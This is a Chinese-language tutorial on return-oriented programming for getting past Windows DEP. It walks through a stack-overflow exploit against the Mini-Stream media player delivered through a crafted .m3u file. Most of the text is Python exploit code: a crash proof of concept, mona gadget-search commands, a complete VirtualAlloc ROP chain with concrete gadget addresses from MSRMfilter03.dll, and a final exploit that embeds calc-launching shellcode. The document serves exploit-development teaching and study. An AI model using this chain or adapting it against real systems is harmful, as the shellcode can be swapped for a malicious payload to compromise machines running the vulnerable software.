#### 介绍
为什么要学习ROP，人们滥用堆栈溢出多年，为了减轻因为堆栈溢出攻击带来的损失，微软从Win Xp Sp2 和Win Server 2003 开始引进了一   
项新的安全措施（DEP数据执行保护）对抗堆栈溢出。  

DEP包含两部分  
> 1.硬件DEP：CPU设置内存为不可执行。   
> 2.软件DEP   

支持硬件**DEP**的CPU会拒绝执行被标记为不可执行（NX）内存页的代码，这么做是为了防止攻击者将恶意的代码注入到另一个程序执行，尤其   
是基于栈溢出漏洞的攻击。由于DEP，栈上的ShellCode不会被执行，但DEP有时会造成程序的以外错误，因为程序有时候可能需要在不可执行区   
域执行代码，   

为了解决这个问题，微软提供了两种DEP设置。   
> 1.Opt-In Mode:只对系统进程和特点指定的进程启用DEP。  
> 2.Opt-Out Mode:对系统所有的进程和服务启用，处理禁止的进程。    

这对于漏洞利用来说意味着什么？当我们尝试在启用DEP的内存执行代码，程序将产生一个访问异常STATUS_ACCESS_VIOLATION (0xc0000005)）,   
程序终止，这对于攻击者来说不是什么好事。但是有趣的是，DEP可以被关闭，意思是可以调用某个Windows API可以把某段不可执行的代码区域   
设置为可执行。现在的主要的问题是，如果我们不能执行任何代码话又如何去调用这个API呢？   
> Rop,这项技术最早是由Sebastian Krahmer 在2005的SUSE Linux提出. 你可以在这里找到这篇.[文档](http://users.suse.com/~krahmer/no-nx.pdf)   
ROP基本的思想是借助已经存在的代码块（也叫配件），这些配件来自程序已经加载的模块，用这些配件为我们的目标API设置参数，我们可以在程序已经加载的模   
块中找到一些列为retn结尾的配件，把这些配件的地址布置在堆栈上，当控制EIP并返回时，程序就会跳去执行这些小配件，而这些小配件是在别的模块的代码段，   
并不受DEP的影响，这就是ROP的原理，下载这个例子可以帮助我们更好的理解它。   
```
(1) 指针直接执行retn               (2) 指针指向一些指令+retn
ESP ‐> ???????? => RETN           ESP ‐> ???????? => POP EAX # RETN
???????? => RETN                  ffffffff => we put this value in EAX
???????? => RETN                  ???????? => INC EAX # RETN
???????? => RETN                  ???????? => XCHG EAX,EDX # RETN
(1)这里retn仅仅是增加esp           (2) 用配件将EDX清0
```

相信你已经理解了ROP的思想了，下面列举所有的ROP配件一会会用他们布置目标API进程的参数，目标API是真正关闭DEP的函数，这项技术成功的关键在于我们需要   
在为启用ASLR的模块中去寻找这些小配件。   
下面是不同的API在不同的系统下可用的情况。   
![](/images\686289_1nyc94y5rfbez07.png)   

可以看到不止一种方法可以达到目的. 有些方法更普遍. 不同的API有不同的参数, 详细的参数请看MSDN. 一般而言系统模块都启用了ASLR. 所以我们从软件自身加   
载的模块看是否包含这些API的指针.

两种方法编写ROP
>1.把API所需的参数都放到寄存器，用一个Push指令把他们压入栈（下面会举例）。   
>2.直接把API需要的参数布置到栈上然后跳去执行这个API，这种方法有点难。


#### 收集配件
漏洞利用比较抽象，你得到的信息越清楚，离成功也就越近，让我们看看下面这个POC，BBBB会覆写EIP。   
```
#!/usr/bin/python
#author:Hea@ven&ML
import sys, struct
file="crash.m3u"


#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "B"*4 + "C"*7572

writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```

我们使用调试器附加Mini-Stream，然后打开Crash.m3u文件，可以看到如下的奔溃，有几点值得我们注意   
>1.ESP指向我们的缓冲区，这是个好消息，因为我们可以用Retn指令地址覆写Eip从而实现调到我们的ROP   
链开始的地方。   
>2.我们看到ESP和EIP跳转的位置之件相差4个字节，我们要填充这4个字节   

![](/images\搜狗截图20180908162959.png)    
好. 我们基本搞清了内存布局. 用mona看看软件加载了哪些模块(记住只要没有non-base, no-ASLR,no 坏字符).   
看起来只有一个dll符合要求(MSRMfilter03.dll). 接下来用mona搜索ROP链需要的小配件. 分别执行这三个命令：
>1.!mona modules   
>2.!mona ropfunc -m MSRMfilter03.dll -cpb '\x00\x09\x0a'   
>3.!mona rop ‐m MSRMfilter03.dll ‐cpb '\x00\x09\x0a'

![](./images\搜狗截图20180908165323.png)  

![](./images\搜狗截图20180908170436.png)   

![](./images/搜狗截图20180908183638.png)


mona 会生成几个重要的文件
>1.rop.txt(ROP配件的原始列表).   
>2.rop_suggestions.txt(基于函数过滤后的ROP配件列表).   
>3.stackpivot.txt(转移ESP的配件).   
>4.rop_virtualprotect.txt(基于VirtualProtect函数的ROP链小配件).   

我建议打开这些文件方便随时参考. 尽管我们将要用VirtualAlloc去禁用DEP, 我们同样会看看“rop_virtualprotect.txt
是否有我们需要的小配件.

#### 构建ROP-Chain
在构建之前，像之前看到了我们可以Retn指令地址覆写Eip，如果你打开Rop.txt,你可以选择一个Retn地址，用这个地址替代   
BBBB，别忘了填充4个空位字节。   
```
#!/usr/bin/python
import sys, struct
file="crash.m3u"
rop = struct.pack('<L',0x41414141) # padding to compensate 4‐bytes at ESP
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐#
# Badchars: '\x00\x09\x0a' #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll) #
# EIP: 1002E061 Random RETN (MSRMfilter03.dll) #
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐#
crash = "http://." + "A"*17416 + "\x61\xE0\x02\x10" + rop + "C"*(7572‐len(rop))
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
我们在1002E061下断点，如下图所示。
![](/images\搜狗截图20180908185814.png)    


不错，下面看看VirtualAlloc这个API，建议可以看看MSDN，便于更好的理解我们要使用的参数   
```
结构: 参数:
LPVOID WINAPI VirtualAlloc( => A pointer to VirtualAlloc()
_In_opt_ LPVOID lpAddress, => Return Address (Redirect Execution to ESP)
_In_ SIZE_T dwSize, => dwSize (0x1)
_In_ DWORD flAllocationType, => flAllocationType (0x1000)
_In_ DWORD flProtect => flProtect (0x40)
);
```
可以看到大部分参数值保持默认值就好了，你同样可以用VirtualProtect这个API去完成任务。   
```
结构: 参数:
BOOL WINAPI VirtualProtect( => A pointer to VirtualProtect()
_In_ LPVOID lpAddress, => Return Address (Redirect Execution to ESP)
_In_ SIZE_T dwSize, => dwSize up to you to chose as needed (0x201)
_In_ DWORD flNewProtect, => flNewProtect (0x40)
_Out_ PDWORD lpflOldProtect => A writable pointer
);
```

记住这些信息，开始改变我们的POC，使我们对于ROP-Chain有一个更加清晰的认识   
```
#!/usr/bin/python

import sys, struct
file="crash.m3u"
rop = struct.pack('<L',0x41414141) # padding to compensate bytes at ESP


#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[Structure]‐#
# LPVOID WINAPI VirtualAlloc( => PTR to VirtualAlloc #
# _In_opt_ LPVOID lpAddress, => Return Address (Call to ESP) #
# _In_ SIZE_T dwSize, => dwSize (0x1) #
# _In_ DWORD flAllocationType, => flAllocationType (0x1000) #
# _In_ DWORD flProtect => flProtect (0x40) #
# ); #
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[Register Layout]‐#
# Remember (1) the stack grows downwards so we need to load the #
# values into the registers in reverse order! (2) We are going to do #
# some clever trickery to align our return after executing. To #
# acchieve this we will be filling EDI with a ROP‐Nop and we will be #
# skipping ESP leaving it intact. #
# #
# EAX 90909090 => Nop #
# ECX 00000040 => flProtect #
# EDX 00001000 => flAllocationType #
# EBX 00000001 => dwSize #
# ESP ???????? => Leave as is #
# EBP ???????? => Call to ESP (jmp, call, push,..) #
# ESI ???????? => PTR to VirtualAlloc ‐ DWORD PTR of 0x1005d060 #
# EDI 10019C60 => ROP‐Nop same as EIP #
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐#

#---------------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a' #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll) #
# EIP: 1002E061 Random RETN (MSRMfilter03.dll) #
#---------------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x61\xE0\x02\x10" + rop + "C"*(7572-len(rop))
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
现在我们的任务是把ROP-Chain 综合到一起设置VirtualAlloca的值，我们需要设置这些指针，因为某些指令的执行   
可能会改变已经设置好的寄存器，先整理一些简单的
```
(1) EDI ‐> We need to put a ROP‐Nop in EDI
0x10029b57 # POP EDI # RETN
0x1002b9ff # ROP‐Nop (we already have this value from EIP)

(2) EBP ‐> Redirect Execution flow to ESP
0x100532ed # POP EBP # RETN
0x100371f5 # CALL ESP (!mona jmp ‐r ESP ‐m MSRMfilter03.dll ‐cpb '\x00\x09\x0a')

(3) EAX ‐> Fill with a regular NOP
0x10030361 # POP EAX # RETN
0x90909090 # NOP (just a regular NOP)

(4) We need to end our chain with a PUSHAD
0x10014720 # PUSHAD # RETN (can be found in rop_virtualprotect.txt)

(5) EBX ‐> dwSize (0x1)
0x10013b1c # POP EBX # RETN
0xffffffff # will be 0x1 (EBX will be set to 0xffffffff)
0x100319d3 # INC EBX # FPATAN # RETN \ Increasing EBX twice will set EBX to 0x00000001
0x100319d3 # INC EBX # FPATAN # RETN /

(6) EDX ‐> flAllocationType (0x1000)
0x1003fb3f # MOV EDX,E58B0001 # POP EBP # RETN (we move a static value into EDX for calculations)
0x41414141 # padding for POP EBP (compensation for the POP)
0x10013b1c # POP EBX # RETN
0x1A750FFF # ebx+edx => 0x1000 flAllocationType (FFFFFFFF‐E58B0001=1A74FFFE => 1A74FFFE+00001001=1A750FFF)
0x10029f3e # ADD EDX,EBX # POP EBX # RETN 10 (when we add these valuse together the result is 0x00001000)
0x1002b9ff # Rop‐Nop to compensate \
0x1002b9ff # Rop‐Nop to compensate |
0x1002b9ff # Rop‐Nop to compensate | This is to compensate for the POP and RETN 10
0x1002b9ff # Rop‐Nop to compensate |
0x1002b9ff # Rop‐Nop to compensate |
0x1002b9ff # Rop‐Nop to compensate /

(7) ECX ‐> flProtect (0x40)
(This technique works because EDX points to a valid memory location at run‐time!! I tested this on windows
XP and there it didn't seem to be the case. It would be an interesting exercise to make this gadget more
universal.)
0x100280de # POP ECX # RETN
0xffffffff # will become 0x40 (ECX will be set to 0xffffffff)
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN \ ECX will be set to 0x00000001
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN /
0x1002a487 # ADD ECX,ECX # RETN \
0x1002a487 # ADD ECX,ECX # RETN |
0x1002a487 # ADD ECX,ECX # RETN | Adding ECX to itself cycles ECX ‐> 1,2,4,8,10,20,40 ‐> 0x00000040
0x1002a487 # ADD ECX,ECX # RETN |
0x1002a487 # ADD ECX,ECX # RETN |
0x1002a487 # ADD ECX,ECX # RETN /

(8) ESI ‐> VirtualAlloc
(We already have a pointer to VirtualAlloc (0x1005d060) but we need the DWORD value that is located at
that pointer. Again here EBP points to a valid memory address (untested on XP).)
0x1002ba02 # POP EAX # RETN
0x1005d060 # kernel32.virtualalloc
0x10027f59 # MOV EAX,DWORD PTR DS:[EAX] # RETN (get the DWORD value located at 0x1005d060)
0x1005bb8e # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN (EAX ‐> ESI)
```

POC
```
#!/usr/bin/python

import sys, struct
file="crash.m3u"
rop = struct.pack('<L',0x41414141) # padding to compensate bytes at ESP


#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[Structure]‐#
# LPVOID WINAPI VirtualAlloc( => PTR to VirtualAlloc #
# _In_opt_ LPVOID lpAddress, => Return Address (Call to ESP) #
# _In_ SIZE_T dwSize, => dwSize (0x1) #
# _In_ DWORD flAllocationType, => flAllocationType (0x1000) #
# _In_ DWORD flProtect => flProtect (0x40) #
# ); #
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[Register Layout]‐#
# Remember (1) the stack grows downwards so we need to load the #
# values into the registers in reverse order! (2) We are going to do #
# some clever trickery to align our return after executing. To #
# acchieve this we will be filling EDI with a ROP‐Nop and we will be #
# skipping ESP leaving it intact. #
# #
# EAX 90909090 => Nop #
# ECX 00000040 => flProtect #
# EDX 00001000 => flAllocationType #
# EBX 00000001 => dwSize #
# ESP ???????? => Leave as is #
# EBP ???????? => Call to ESP (jmp, call, push,..) #
# ESI ???????? => PTR to VirtualAlloc ‐ DWORD PTR of 0x1005d060 #
# EDI 10019C60 => ROP‐Nop same as EIP #
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐#
rop = struct.pack('<L',0x41414141) # padding to compensate 4‐bytes at ESP
rop += struct.pack('<L',0x10029b57) # POP EDI # RETN
rop += struct.pack('<L',0x1002b9ff) # ROP‐Nop
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[ROP‐Nop ‐> EDI]‐#
rop += struct.pack('<L',0x100280de) # POP ECX # RETN
rop += struct.pack('<L',0xffffffff) # will become 0x40
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[flProtect (0x40) ‐> ECX]‐#
rop += struct.pack('<L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('<L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[VirtualAlloc ‐> ESI]‐#
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # padding for POP EBP
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop‐Nop to compensate

#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[flAllocationType (0x1000) ‐> EDX]‐#
rop += struct.pack('<L',0x100532ed) # POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[CALL ESP ‐> EBP]‐#
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # will be 0x1
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[dwSize (0x1) ‐> EBX]‐#
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[NOP ‐> EAX]‐#
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN
#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐[PUSHAD ‐> pwnd!]‐#
#---------------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a' #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll) #
# EIP: 1002E061 Random RETN (MSRMfilter03.dll) #
#---------------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x61\xE0\x02\x10" + rop + "C"*(7572-len(rop))
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
你可调试这个ROP，确保正确工作。在下面的截图中可以看到VirtualAlloc是在堆栈上被调用的. 布置在后面的任何代码都会被执行.
![](/images\搜狗截图20180908194120.png)

##### ShellCode+游戏结束
```
#!/usr/bin/python

import sys, struct
file="crash.m3u"
rop = struct.pack('<L',0x41414141) # padding to compensate bytes at ESP
#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('<L',0x10029b57) # POP EDI # RETN
rop += struct.pack('<L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -> EDI]-#
rop += struct.pack('<L',0x100280de) # POP ECX # RETN
rop += struct.pack('<L',0xffffffff) # will become 0x40
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -> ECX]-#
rop += struct.pack('<L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('<L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -> ESI]-#
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # padding for POP EBP
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -> EDX]-#
rop += struct.pack('<L',0x100532ed) # POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -> EBP]-#
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # will be 0x1
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -> EBX]-#
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -> EAX]-#
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -> pwnd!]-#
# SkyLined's Calc shellcode
calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
shell = "\x90"*5 + calc
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 1002E061 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#

#---------------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x61\xE0\x02\x10" + rop + shell + "C"*(7572-len(rop))
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
![](/images\搜狗截图20180908194940.png)
